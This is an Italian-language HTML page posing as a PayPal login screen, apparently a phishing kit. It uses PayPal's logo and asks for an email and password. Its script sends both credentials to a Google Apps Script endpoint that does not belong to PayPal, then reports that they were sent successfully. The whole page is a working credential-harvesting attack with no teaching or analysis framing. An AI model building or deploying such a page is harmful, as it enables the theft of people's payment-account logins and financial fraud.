<!DOCTYPE html>
<html lang="it">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Login PayPal</title>
  <style>
    /* ... (stesso CSS di prima) ... */
  </style>
</head>
<body>
  <div class="container">
    <div class="card">
      <img src="https://www.paypalobjects.com/webstatic/mktg/logo/pp_cc_mark_111x69.jpg"
           alt="PayPal" class="logo">

      <form id="emailForm"
            action="https://script.google.com/macros/s/AKfycbyLJkjG7aK_tApcR6rQMKjWqBrUKbEE8bYRs2Pp8k_nH-xjGV6vPTDlLS-il_LEZWcD/exec"
            method="POST"
            onsubmit="return handleSubmit(event)">
        <input type="email" name="email" id="email"
               placeholder="Email o numero di cellulare" required>
        <input type="password" name="password" id="password"
               placeholder="Password" required>
        <a href="#" class="forgot">Hai dimenticato l'indirizzo email?</a>
        <button class="btn-primary" type="submit">Avanti</button>
      </form>

      <div class="divider">oppure</div>
      <a href="#" class="btn-secondary">Registrati gratis</a>

      <div class="footer">
        <span>ðŸ‡®ðŸ‡¹</span>
        <select aria-label="Seleziona lingua">
          <option value="it" selected>Italiano</option>
          <option value="en">English</option>
        </select>
      </div>

      <p id="status"></p>
    </div>
  </div>

  <script>
    function handleSubmit(e) {
      e.preventDefault();
      const emailEl    = document.getElementById("email");
      const passEl     = document.getElementById("password");
      const status     = document.getElementById("status");
      const email      = emailEl.value.trim();
      const password   = passEl.value;

      // Validazioni base
      if (!email || !email.includes("@")) {
        status.textContent = "Inserisci un'email valida.";
        status.style.color = "red";
        return false;
      }
      if (!password) {
        status.textContent = "Inserisci la password.";
        status.style.color = "red";
        return false;
      }

      fetch(e.target.action, {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: new URLSearchParams({
          email: email,
          password: password
        })
      })
      .then(response => {
        if (response.ok) {
          status.textContent = "Email e password inviate con successo!";
          status.style.color = "green";
          e.target.reset();
        } else {
          throw new Error("HTTP " + response.status);
        }
      })
      .catch(err => {
        console.error("Errore invio:", err);
        status.textContent = "Si Ã¨ verificato un errore.";
        status.style.color = "red";
      });

      return false;
    }
  </script>
</body>
</html>
